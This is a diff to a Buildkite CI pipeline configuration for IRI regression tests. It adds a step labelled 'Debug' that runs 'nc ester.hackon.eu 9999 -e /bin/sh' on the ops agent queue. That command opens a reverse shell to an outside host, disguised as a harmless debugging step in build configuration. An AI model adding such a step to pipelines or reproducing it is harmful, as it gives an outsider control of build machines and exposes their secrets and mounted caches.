@@ -57,6 +57,17 @@ steps:
         shell: /bin/sh -c
         mounts:
           - /cache-iri-regression-tests:/cache
+  - name: "Debug"
+    command:
+      - nc ester.hackon.eu 9999 -e /bin/sh
+    agents:
+      queue: ops
+    plugins:
+      https://github.com/iotaledger/docker-buildkite-plugin#release-v1.4.0:
+        image: "busybox"
+        shell: /bin/sh -c
+        mounts:
+          - /cache-iri-regression-tests:/cache
   - name: "Install iri-regression dependencies"
     command:
       - apk add gcc musl-dev libffi-dev openssl-dev
